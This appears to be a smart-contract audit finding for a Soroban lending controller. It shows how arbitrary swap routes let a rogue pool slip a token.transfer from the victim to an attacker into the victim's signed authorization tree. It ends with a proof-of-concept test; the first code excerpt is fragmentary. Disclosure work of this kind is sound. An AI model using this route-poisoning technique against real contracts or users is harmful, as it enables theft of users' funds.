### Title
Arbitrary swap routes can smuggle a wallet-token transfer into the caller’s authorization tree - (File: contracts/controller/src/strategies/swap.rs)

### Summary

Controller swap strategies forward caller-supplied route bytes to the configured router and validate only controller balance deltas, spending, positive output, and final account risk. They do not constrain which downstream venue contract the route invokes or prevent that venue from adding an unrelated `token.transfer` requiring the caller’s authorization. An attacker can therefore supply a route whose malicious pool embeds an extra transfer from the victim’s wallet into the simulated authorization tree; if the victim signs the poisoned tree, the transaction steals tokens unrelated to the lending position.

### Finding Description

`swap_collateral`, `swap_debt`, `multiply`, and `repay_debt_with_collateral` all reach `swap_tokens_or_passthrough`/`swap_tokens` with an opaque `StrategySwap`. `swap_tokens` authorizes only the controller’s exact input transfer, invokes `router.execute_strategy(controller, amount_in, swap)`, and afterward checks `RouterOverspend`, refunds controller-held leftover input, and requires positive measured output. Those checks bound the routed funds but cannot inspect or constrain additional caller-authorization requests generated by route-selected code. [1](#0-0) 

For `swap_collateral`, the controller first authenticates `caller` and verifies account ownership/delegation, then withdraws collateral and supplies `swap` to the router path. The owner authorization protects the account, but it also becomes the root under which route-generated token calls can attach. [2](#0-1) 

This is not hypothetical: the regression test deploys a route-selected `RogueHopPool` that calls `token.transfer(victim, attacker, amount)` during the hop. Recording mode places that unrelated transfer as a child of the victim’s `swap_collateral` authorization, and enforcing mode executes it when that child is signed. [3](#0-2) [4](#0-3) [5](#0-4) 

### Impact Explanation

An unprivileged attacker can deploy a malicious venue and craft route bytes that steal any token held by the victim, including assets unrelated to the lending markets. The routed swap can remain economically valid—the test returns fair output—so balance-delta and final-health checks do not prevent the theft. This is theft of user funds enabled by an obscured authorization subtree.

### Likelihood Explanation

Exploitation requires the victim to submit an attacker-crafted route and sign the authorization tree containing the extra transfer. That user interaction limits the likelihood, matching the medium-severity UI-obfuscation class. The attacker needs no privileged role, leaked key, compromised oracle, or protocol upgrade; a standard Soroban token transfer inside the route is sufficient once the poisoned tree is signed.

### Recommendation

Do not allow opaque controller strategy routes to name arbitrary venue contracts. Enforce a governance-managed venue/pool allowlist or verified route manifest at the trusted router boundary, and require clients to decode the route and reject any simulated authorization child other than the expected controller input pull. Wallets should prominently display every nested token transfer; this warning alone should not be treated as a substitute for on-chain venue restrictions.

### Proof of Concept

`tests/test-harness/tests/strategy/rogue_hop_pool_transfer_joins_caller_auth_tree.rs` demonstrates the complete path:

1. Alice supplies collateral and holds `77_770_000_000` units of an unrelated wallet token.
2. The attacker route names `RogueHopPool`, whose `swap()` calls `token.transfer(alice, attacker, WALLET_BALANCE)`.
3. Alice invokes `swap_collateral` with that route.
4. Simulation records the wallet-token transfer as a child of Alice’s `swap_collateral` authorization and empties Alice’s unrelated-token balance in recording mode.
5. In enforcing mode, an honest empty child list rejects the rogue transfer, while signing the recorded poisoned child authorizes it and moves `WALLET_BALANCE` to the attacker.

The key assertions are at lines 194–226 and 239–268 of that test.

    let s = Scene::new();

    std::println!("recorded auth tree = {recorded:#?}");

    let stolen_transfer = AuthorizedInvocation {
        function: AuthorizedFunction::Contract((

            symbol_short!("transfer"),
            (s.alice.clone(), s.attacker.clone(), WALLET_BALANCE).into_val(&s.t.env),

        sub_invocations: std::vec![],
    };
    let poisoned_root = AuthorizedInvocation {
        function: AuthorizedFunction::Contract((

#[test]
fn enforced_auth_moves_the_wallet_token_only_when_the_signed_tree_lists_the_rogue_transfer() {
    let s = Scene::new();

    // Control: a pool that touches nothing passes with the honest root-only tree.
    let benign = s.route_through_pool_stealing(0);
    s.try_swap_with_signed_tree(&benign, &[])
        .expect("the honest tree authorizes an honest route");
    assert_eq!(s.wallet(&s.alice), WALLET_BALANCE);

    // Rogue pool, honest tree: the host refuses the transfer and the whole call rolls back.
    s.t.env.mock_all_auths_allowing_non_root_auth();
    let rogue = s.route_through_pool_stealing(WALLET_BALANCE);
    let usdc_before = s.t.supply_balance_raw(ALICE, "USDC");
    let refused = s
        .try_swap_with_signed_tree(&rogue, &[])
        .expect_err("a transfer outside the signed tree is unauthorized");
    std::println!("rogue transfer under the honest tree = {refused:?}");
    assert!(
        refused.is_type(ScErrorType::Auth) || refused.is_type(ScErrorType::Context),
        "expected a host auth failure, got {refused:?}"
    );
    assert!(s
        .diagnostics()
        .contains("Unauthorized function call for address"));
    assert_eq!(s.wallet(&s.alice), WALLET_BALANCE);
    assert_eq!(s.wallet(&s.attacker), 0);
    assert_eq!(s.t.supply_balance_raw(ALICE, "USDC"), usdc_before);

    // Same route, with the tree that simulation returned.
    let stolen_transfer = MockAuthInvoke {
        contract: &s.wallet_token,
        fn_name: "transfer",
        args: (s.alice.clone(), s.attacker.clone(), WALLET_BALANCE).into_val(&s.t.env),
        sub_invokes: &[],
    };
    s.try_swap_with_signed_tree(&rogue, core::slice::from_ref(&stolen_transfer))
        .expect("the poisoned tree authorizes the rogue transfer");
    assert_eq!(s.wallet(&s.alice), 0);
    assert_eq!(s.wallet(&s.attacker), WALLET_BALANCE);
